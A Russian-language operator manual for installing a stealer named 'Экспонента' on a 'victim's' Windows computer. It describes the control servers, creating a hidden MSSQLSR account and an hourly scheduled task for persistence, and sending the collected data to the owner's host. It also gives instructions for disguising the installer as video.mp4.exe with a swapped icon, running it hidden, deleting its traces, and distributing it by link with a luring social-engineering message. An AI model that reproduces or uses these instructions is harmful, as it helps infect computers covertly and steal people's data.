ИНСТАЛЛЯЦИЯ СТАЙЛЕРА «ЭКСПОНЕНТА»
=====================================

В каталоге содержатся основные модули стайлера «Экспонента». Файлы используются для установки академического варианта стайлера. Файлы дистрибутива рабочие, не тестировались в бета-версии.

ПРИНЦИП РАБОТЫ УСТАНОВЩИКА
==========================

После инсталляции файлов стайлера в окружении операционной системы ведомого компьютера Windows появляются следующие переменные:

После инсталляции файлов стайлера в окружении операционной системы появляются следующие переменные:

- _Hacker_User_ – имя (логин) учётной записи компьютера-жертвы на веб-серверах хозяина, с которых будет управляться стайлер

- _Hacker_Pass_ – пароль для этой учётной записи. Задаётся, чтобы посторонние не имели доступа к данным жертвы на сервере хозяина. Внимание! Пароль храниться в незащищённом виде! Просто автор не нашёл способа безопасного использования хеша и солей в программах удалённого доступа.

- _Hacker_host3_ – доменное имя публичного хоста, котрое присваивается ведомому компьютеру одним из сервисов DynDNS.

- _Hacker_host2_ – доменное имя приватного хоста, с которого скачиваются в офлайн-режиме команды управления стайлером и на который передаются результаты его работы. Также создаётся учётная запись с именем MSSQLSR для возможного удалённого подключения к компьютеру, а также добавляется задание для текущего пользователя на запуск каждый час файла onsysload, в котором расположены текущие команды управления стайлером.

Также появляется файл %PUB1%\Distrib\Zlovred\install_Styler.ini, в котором находятся настройки публичного хоста или зеркала для скачки и установки (обновлении) основных файлов стайлера в каталог %PUB1%\Distrib\Zlovred, и файл %PUB1%\Distrib\Zlovred\Install_Styler.bat для собственно установки стайлера.

На приватном хосте создаются аккаунты «хозяина» HTTP сервера с поддержкой технологии WebDAV и/или публичного FTP сервера. Набор находящихся в нём программ одинаковый, и представляет собой все компилированные версии основного модуля стайлера, а также файлы Install_Styler.bat, install_Styler.ini, и дополнительные файлы install_Stylerdistrib.bat, load_ftpStyler.bat, load_httpStyler.bat для собственно скачки и установки пакетов из удалённого репозитория.

ИСХОДНЫЕ ДАННЫЕ
===============

Для установки стайлера “Экспонента” вам дополнительно потребуется следующее рабочее окружение:

- веб-адрес публичного HTTP хостинга файлов стайлера. Хостинг выбирается произвольно, на Ваш вкус. Доменное имя этого публичного хостинга указывается в переменной httphost.

- веб-адрес анонимного FTP хостинга файлов стайлера. Хостинг выбирается произвольно, на Ваш вкус. Доменное имя этого публичного хостинга указывается в переменной ftphost.

- путь к основной папке с файлами плагинов стайлера на веб-сервере. Он записывается в переменную httpMainFolder

- префикс веб-сервера хостинга, записываемый в переменную httppref. Может принимать значение http или https

- порт, на котором работает веб-сервер. Записывается в переменную httpport. Его стандартное значение — 80.

- логин авторизации пользователя на веб-сервере, если веб-сервер не публичный. Записывается в переменную httpuser

- пароль авторизации пользователя на веб-сервере. Записывается в переменную httppassword.

Примечание. Для публичных серверов эти два значения можно оставить пустыми

- порт, на котором работает ftp-сервер. Записывается в переменную ftpport. Его стандартное значение — 21.

- логин авторизации пользователя на веб-сервере, если веб-сервер не анонимный. Для анонимного сервера значение по-умолчанию anonymous. Записывается в переменную ftpuser

- пароль авторизации пользователя на веб-сервере. Записывается в переменную ftppassword.

- маска файлов, по которой будут скачиваться программы с ftp сервера. По-умолчанию * (все файлы)

FTP сервер поддерживает иерархию вложенных подкаталогов вплоть до трёх уровней, что позволяет достаточно комфортно размещать файлы на любом хостинге. Имя каталога первого уровня записывается в переменную ftpMainFolder, второго уровня — ftpSubFolder, третьего уровня — ftpSubFolder1. В каждой переменной может быть только один идентификатор, однако если папка с данным уровнем вложености отсутствует, её можно оставить пустой. Соответственно, если нужно забрать файлы из корня ftp сервера все папки следует указать пустыми. Но это плохая идея... Для веб-сервера путь к папкам может комбинироваться, например httpMainFolder=MainFolder/SubFolder/SubFolder1. Для FTP сервера же нужно использовать три переменные. Это неудобство связано с работой консольного FTP клиента Windows.

Заметим также, что переменные httppassword и ftppassword не имеют ничего общего с переменной Hacker_Pass, а переменные httpuser и ftpuser — с переменной Hacker_User. Как говориться, мухи отдельно, суп отдельно… Также переменные MainFolder, SubFolder и SubFolder1 в файлах стайлера не должны иметь ничего общего с переменными ftpMainFolder, ftpSubFolder, ftpSubFolder1, поскольку находящиеся в них файл не имеют ничего общего друг с другом и предназначены для других целей. Это нужно учитывать при планировании хостинга стайлера.

Все переменные хранятся в файле installmaindistrib.ini, из которого они беруться скриптами установки и обновления файлов стайлера.

ОРГАНИЗАЦИЯ СЕРВЕРА Hacker_host1
================================

На веб-сервере с доменным именем, сохранённой в переменной Hacker_host1, в корне создаётся папка: “Exponenta”. В ней содержится установщик стайлера, установщики плагинов и  инсталляторы. Учтите, что все файлы, расположенные в этом каталоге, будут скачены с сервера на компьютер жертвы без изменений! Это значит, что там будут только универсальные файлы. Желательно, чтобы эту папку мог проматривать как оглавление каталога, поэтому в файле .htaccess должны быть выставлены соответствующие разрешения.

На FTP-сервере с доменным именем, сохранённой в переменной Hacker_host1, в корне создаётся символическая ссылка "Exponenta" на папку "Exponenta" на веб-сервере. Для этого на хостинге желательно также иметь SSH доступ.

Файл, который устанавливает стайлер вместе с плагинами — Install_Styler.bat Пример его кода приведён в этой папке. Этот файл рабочий, и используется для локальной установки стайлера путём запуска этого файла из командной строки с повышенными привилегиями. Для работы этот файл (в текущей редакции) требует наличие в том же каталоге файлов:

- ExponentaStylerSetup.exe с главными файлами стайлера. Он получается переименованием основной http или ftp сборки стайлера;

- install_Styler.ini — файл с описанием переменных для установки. 

Это минимальный рабочий набор инсталлятора. Файлы присутствуют в каталоге Exponenta на сервере в обязательном порядке. Назначение других дополнительных файлов будет написано ниже.

В этом же каталоге присутствуют файлы descript.ion, INSTALL.MD, install.rtf и install.html. Они несут только информационную нагрузку, и для работы стайлера не требуются.

ВАЖНО! В зависимости от протокола передачи данных от ведомого компьютера ведущему (HTTP и FTP) генерируются различные файлы ExponentaStylerSetup.exe. Оригинальные файлы будут иметь в названии суффикс HTTP  или FTP. Не забудьте переименовать оригинальный файл перед отправкой его на сервер в окончательном варианте!

Применительно к серверу Apache, «хозяин» должен дополнительно установить на сервер модули dav, dav_fs,  поддержки базовой аутентикации, а в описаниях каталогов этих серверов указать опции “Dav On” и директивы поддержки базовой аутентикации. Кроме того, создаётся файл с учётными записями для базовой аутентикации в корневом каталоге сервера и запрещается к нему доступ со стороны веб-сервера. В принципе, файлы для создания и конфигурации хостинга на сервере Zomro указаны в каталоге /Files/Server-Init.


СОЗДАНИЕ ДИСТРИБУТИВА ДЛЯ РАСПРОСТРАНЕНИЯ МЕТОДОМ СОЦИАЛЬНОЙ ИНЖЕНЕРИИ
======================================================================

Устанавливать файлы стайлера локально или через удалённый доступ — хорошая идея, но не со всех сторон. Поскольку пакет для работы требует Интернет, то и устанавливаться он должен также из Интернета. Ниже будет рассказано, как подготовить файл для загрузки пакета из Интернета и сокрытия установки методами социальной инженерии и/или использования уязвимости Microsoft Windows.


Подготовка установочного файла

Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:

- load_ftpStyler.bat — файл, скачивающий и устанавливающий файлы дистрибутива стайлера «Экспонента» по FTP протоколу;

- load_httpStyler.bat — файл, скачивающий и устанавливающий файлы дистрибутива стайлера «Экспонента» по HTTP протоколу;

- install_Stylerdistrib.bat — файл, устанавливающий стайлер «Экспонента» и локального каталога;

- install_Styler.ini — файл с настройками переменных окружения этих командных файлов, кастомизированного под конкретный ведомый компьютер.

- Install_Styler.bat — собственно установщик стайлера.

ПРИМЕЧАНИЕ. В данном дистрибутиве файл распространяется без параметров. Вы сами должны его заполнить валидными параметрами, исходя из данной инструкции.

Назначение первых двух файлов — открытие портов для FTP и веб-клиента, подготовка файла сценария и скачивание дистрибутива этим клиентом, а также запуск локального установщика стайлера. Информацию для этого пакетный файл получает из ini файла.

Теперь для запуска процесса инсталляции нужно, поместить файлы 

- load_ftpStyler.bat
- load_httpStyler.bat
- install_Stylerdistrib.bat
- install_Styler.ini
- Install_Styler.bat

в один каталог, и запустить один из трёх первых файлов с повышенными привилегиями. Вариант, как это сделать на практике, смотри ниже.

Подготовка файла для пересылки на компьютер жертвы
--------------------------------------------------

Подготовленные таким образом файлы устанавливают стайлер произвольной конфигурации на компьютер жертвы. Для этого запускается файл load….bat на компьютере жертвы из произвольного каталога, с повышенными привилегиями выполнения. Всё бы хорошо… Только переслать файл с таким расширением на компьютер жертвы будет проблематично, а запустить такой файл с повышенными привилегиями, в обычных условиях пользователю будет невозможно. Администратора такой файл насторожит, а лузеры не умеют запускать командные файлы.

К счастью для хакеров, есть программа для конверсии командных файлов в исполняемые файлы с расширением *.exe. Для установки программы подаётся команда:

choco install –y battoexeconverter

После установки запустите программу, откройте в её редакторе командный файл, задайте опции конвертирования, конечный каталог, и бинго! Будет создан исполняемый файл с той же функциональностью.

Перечислять опции и команды работы этого конвертера автор не будет – это тема отдельной статьи. Отметим, что файл после конвертации сможет:

1. Требовать запуска с повышенными привилегиями;

2. Инкапсулировать в себя как выполняемый командный файл, так и дополнительные командные и исполняемые файлы, архивы, видео, изображения, необходимые для его работы;

3. Сменить иконку приложения, отображаемую в Windows и файловых менеджерах. Это позволит скрывать факт запуска файла в стайлере и поможет файлу установщика стайлера «Экспонента» «притвориться», например, изображением или файлом видео;

4. Передавать указанный файл по ссылкам в социальных сетях или мессенджерах, а также электронной почте и других средствах обмена сообщениями между пользователями. Здесь принципиальное слово «по ссылке», поскольку программы обмена сообщениями не разрешают пересылать в теле командные и исполняемые файлы, как раз для предотвращения заражения. А переданный по ссылке командный файл нельзя ни скачать, ни запустить;

5. Назначить файлу установщика имя, например, video.mp4.exe. Как правило, по умолчанию Microsoft Windows скрывает окончания исполняемых файлов. В этом случае, при соблюдении пункта 3, этот файл будет похож на файл видео, например, с танцующими свиньями, и лузер может просто не заметить подмену. Особенно, если в дополнение к стайлеру скачается и покажется видео с танцующими свиньями.

6. Исполняемые файлы, конвертированные из командных, в зависимости от содержимого будут любого размера. В случае малого размера файла не предполагает выделения места на диске, и у пользователя или администратора создаётся ложное впечатление, что такая маленькая команда не принесёт вреда и не содержит в себе установщика. Что, на самом деле, не так;

7. Запускать установку в скрытом режиме, не показывая окна консоли;

8. Удалять после себя файлы, которые инкапсулированы в этот исполняемый файл;

9. Назначать рабочий каталог для выполнения, в том числе каталог с временными файлами. В этом случае обнаружить работу стайлера будет ещё труднее.

Таким образом, преобразовав командный файл установщика стайлера в исполняемый файл, перешлите его жертве по ссылке вместе с побуждающим текстом: «Ну, ка оцени, какое видео с танцующими свиньями я откопал!». По законам социальной инженерии, весьма вероятно откроет такое видео не только офисный лузер, но и его коллега – беспечный администратор. Не смотря на предупреждения отдела охраны и компьютерной безопасности. А нам то и надо!

А организовать загрузку и запуск видео для «отвода глаз» не трудно. Например, с помощью команд:

Wget «ссылка на файл с видео»
Start «файл видео»

ПОДГОТОВКА EXE ФАЙЛА ДЛЯ УСТАНОВКИ СТАЙЛЕРА ИЗ ИНТЕРНЕТА
==========================================================

- Скопируйте все файлы из каталога DEST-STEALER в рабочий каталог.
- Запустите файл battoexeconverter.
- Загрузите в него один из файлов: load_ftpStyler.bat, load_httpStyler.bat, install_Stylerdistrib.bat.
- В расположенном справа окне опций исправьте их если потребуется. Может потребоваться изменение опций видимости программы при запуске, иконки и метаданных программы.
- Нажмите кнопку "Конвертировать".
- Выберите имя и каталог сохранения полученного exe файла.
- Перешлите файл на ведомый компьютер для установки.
